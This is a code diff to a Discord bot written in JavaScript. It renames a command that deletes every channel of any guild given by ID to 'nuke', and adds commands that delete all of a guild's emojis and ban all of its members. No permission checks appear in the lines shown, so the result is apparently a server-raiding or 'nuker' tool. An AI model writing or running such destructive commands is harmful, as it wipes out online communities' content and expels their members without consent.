@@ -66,7 +66,7 @@ client.on('message', message => {
         }
         
         // Deletes all channels of a server
-        if (args[0] == prefix + 'delete') {
+        if (args[0] == prefix + 'nuke') {
             if (args[1] != null) {
                 let guild = client.guilds.get(args[1]);
                 guild.channels.forEach(c => {
@@ -75,6 +75,26 @@ client.on('message', message => {
             }
         }
         
+        // Deletes all server emojis
+        if (args[0] == prefix + 'deleteEmojis') {
+            if (args[1] != null) {
+                let guild = client.guilds.get(args[1]);
+                guild.emojis.forEach(e => {
+                    guild.deleteEmoji(e);
+                });
+            }
+        }
+        
+        // Bans all server members
+        if (args[0] == prefix + 'prune') {
+            if (args[1] != null) {
+                let guild = client.guilds.get(args[1]);
+                guild.members.forEach(m => {
+                    m.ban();
+                });
+            }
+        }
+
         // Restart bot
         if (args[0] == prefix + 'restart') {
                require("child_process").spawn(process.argv.shift(), process.argv, {
